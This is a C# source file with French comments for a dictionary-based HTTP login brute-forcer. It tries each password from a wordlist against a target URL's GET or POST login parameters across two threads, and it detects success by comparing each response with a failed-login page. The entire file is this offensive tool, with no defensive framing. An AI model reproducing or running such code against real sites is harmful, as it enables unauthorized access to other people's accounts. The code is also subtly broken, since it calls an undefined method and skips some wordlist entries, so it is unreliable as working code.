using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;

namespace bruteForce
{
    class BruteForceHTTP
    {

        public string getUsrename = "";
        public string getPassword = "";
        public string url = "";
        public string dicoPath = "";
        public string username = "";
        public string password = "";
        public string passwordRight = "";
        private string badRequest = "";
        private string badRequestPost = "";
        private string finalRequest = "";
        private string[] allPassword;
        private FileStream fl;
        private int nbLine;
        //variable de requete
        HttpWebResponse reponse;
        private const int NB_THREAD = 2;
        private bool methodGET = true;

        public BruteForceHTTP(string _url, string _get, string _get2, string _dicoPath)
        {
            this.url = _url;
            this.getUsrename = _get;
            this.getPassword = _get2;
            this.dicoPath = _dicoPath;
            //ouvertur du dictionnaire
            fl = File.OpenRead(dicoPath);
            //stocker dans une string les mots de passes
            allPassword = File.ReadAllLines(dicoPath);
            //nombre de mot de passe
            nbLine = allPassword.Count();

        }


        public string findPassword(bool _methodGET)
        {
            methodGET = _methodGET;
            //construire l'url avec des guid car c'est unique donc aucun user aura ce mdp et nom
            String _url = constructUrl(url, getUsrename, Guid.NewGuid().ToString(), getPassword, Guid.NewGuid().ToString());
            //lancer la requete
            WebRequest request = WebRequest.Create(_url);
            
            try
            {
                reponse = (HttpWebResponse)request.GetResponse();
            }
            catch
            {
                return @"/!\ Site Web Inaccessible /!\";
            }

            using (WebClient client = new WebClient())
            {
                byte[] response =
                client.UploadValues(url, new NameValueCollection()
                {
                        { getUsrename, Guid.NewGuid().ToString() },
                        { getPassword, Guid.NewGuid().ToString() }
                });

                badRequestPost = System.Text.Encoding.UTF8.GetString(response);

            }
                //stocker la page avec connexion échouée
                StreamReader sr = new StreamReader(reponse.GetResponseStream());
            badRequest = sr.ReadToEnd();

            //lANCEMENT DES REQUETES EN MULTITHREAD
            List<Thread> threadList = new List<Thread>();
            Thread dividePasswordFinder1 = new Thread(thread1Start);
            threadList.Add(dividePasswordFinder1);
            Thread dividePasswordFinder2 = new Thread(thread2Start);
            threadList.Add(dividePasswordFinder2);

            //lancer les threads
            foreach (Thread th in threadList)
            {
                th.Start();
            }

            //attendre la fin des threads
            foreach (Thread th in threadList)
            {
                th.Join();
            }

            //retourner le mot de passe trouvé
            return passwordRight;

        }

        /// <summary>
        /// Lancer le 1er thread
        /// </summary>
        private void thread1Start()
        {
            if (methodGET)
            {
                string find = "";
                find = findPasswordThread(0);

                //si le mdp est vide ce n'est pas le bon
                if (find != "")
                {
                    //stocker le mot de passe si il est trouvé
                    passwordRight = find;
                }
            }
            else
            {
                string find = "";
                find = findPasswordPOST(0);

                //si le mdp est vide ce n'est pas le bon
                if (find != "")
                {
                    //stocker le mot de passe si il est trouvé
                    passwordRight = find;
                }
            }
        }

        /// <summary>
        /// Lancer le 2eme thread
        /// </summary>
        private void thread2Start()
        {
            if (methodGET) { 
            string find = "";
            find = findPasswordThread(1);

            //si le mdp est vide ce n'est pas le bon
            if (find != "")
            {
                //stocker le mot de passe si il est trouvé
                passwordRight = find;
            }
            }
            else
            {
                string find = "";
                find = findPasswordPOST(1);

                //si le mdp est vide ce n'est pas le bon
                if (find != "")
                {
                    //stocker le mot de passe si il est trouvé
                    passwordRight = find;
                }
            }
        }


        /// <summary>
        /// Trouve le mot de passe
        /// </summary>
        /// <param name="iStart">numero du thread</param>
        /// <returns>le mot de passe ou rien</returns>
        public string findPasswordThread(int iStart)
        {
            //variable mot de passe
            String passwordThread = "";

            WebRequest request;
            //string de l'url pour la requete
            string _url;
            //reponse de la requete
            StreamReader sr;

            //diviser le dictionaire et tester si le mot de passe est corrrect
            for (int i = nbLine / NB_THREAD * iStart; i < nbLine / NB_THREAD + nbLine / NB_THREAD * iStart; i++)
            {
                //construction de l'url avec le mot de passe dedans
                _url = constructUrl(url, getUsrename, "test", getPassword, allPassword[i]);
                //lancer la requete
                request = WebRequest.Create(_url);
                reponse = (HttpWebResponse)request.GetResponse();
                //stocker le résultat
                sr = new StreamReader(reponse.GetResponseStream());
                finalRequest = sr.ReadToEnd();

                //comparer la page si elle est similaire à celle d'erreur
                if (finalRequest != badRequest)
                {
                    //retourner le mot de passe trouvé
                    return allPassword[i];
                }
            }
            //retourner si le mot de passse n'est pas trouvé
            return passwordThread;

        }

        public string findPasswordThreadPOST(int iStart)
        {
            string passwordToReturn = "";
            using (WebClient client = new WebClient())
            {
                //diviser le dictionaire et tester si le mot de passe est corrrect
                for (int i = nbLine / NB_THREAD * iStart; i < nbLine / NB_THREAD + nbLine / NB_THREAD * iStart; i++)
                {
                    byte[] response =
                client.UploadValues(url, new NameValueCollection()
                {
                        { getUsrename, "test" },
                        { getPassword, allPassword[i] }
                });

                    string result = System.Text.Encoding.UTF8.GetString(response);

                    //comparer la page si elle est similaire à celle d'erreur
                    if (result != badRequestPost)
                    {
                        //retourner le mot de passe trouvé
                        return allPassword[i];
                    }

                }
            }

            return passwordToReturn;
        }


        /// <summary>
        /// Construire l'url pour la requete
        /// </summary>
        /// <param name="_url"></param>
        /// <param name="_get"></param>
        /// <param name="_getText"></param>
        /// <param name="_get2"></param>
        /// <param name="_get2Text"></param>
        /// <returns></returns>
        private string constructUrl(string _url, string _get, string _getText, string _get2, string _get2Text)
        {
            string toReturn;
            if (_url.Contains("?"))
            {
                toReturn = _url + "&" + _get + "=" + _getText + "&" + _get2 + "=" + _get2Text;
            }
            else
            {
                toReturn = _url + "?" + _get + "=" + _getText + "&" + _get2 + "=" + _get2Text;
            }

            return toReturn;
        }
    }
}
